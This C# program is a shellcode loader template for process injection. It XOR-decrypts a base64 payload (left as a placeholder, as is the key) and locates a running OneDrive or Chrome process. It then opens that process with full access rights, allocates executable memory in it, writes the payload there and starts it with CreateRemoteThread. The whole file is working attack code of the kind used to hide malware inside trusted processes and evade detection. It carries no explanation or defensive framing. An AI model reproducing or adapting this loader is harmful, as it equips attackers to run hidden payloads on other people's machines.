using System;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

internal class Program
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    public static byte[] dec(byte[] data, string key)
    {
        byte[] keyBytes = Encoding.UTF8.GetBytes(key);
        byte[] result = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
        {
            result[i] = (byte)(data[i] ^ keyBytes[i % keyBytes.Length]);
        }
        return result;
    }
    static void Main(string[] args)
    {
        string encodedData;
        encodedData = "<base64_payload>";
        byte[] decodedData = Convert.FromBase64String(encodedData);
        int size = decodedData.Length;
        string k = "<key>";
        byte[] decr_data = dec(decodedData, k);
        var process = Process.GetProcessesByName("OneDrive").FirstOrDefault()
         ?? Process.GetProcessesByName("Chrome").FirstOrDefault();
        if (process == null)
        {
            Environment.Exit(0);
        }
        int pid = process.Id;
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)size, 0x3000, 0x40);
        IntPtr outSize;
        WriteProcessMemory(hProcess, addr, decr_data, decr_data.Length, out outSize);
        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

    }
}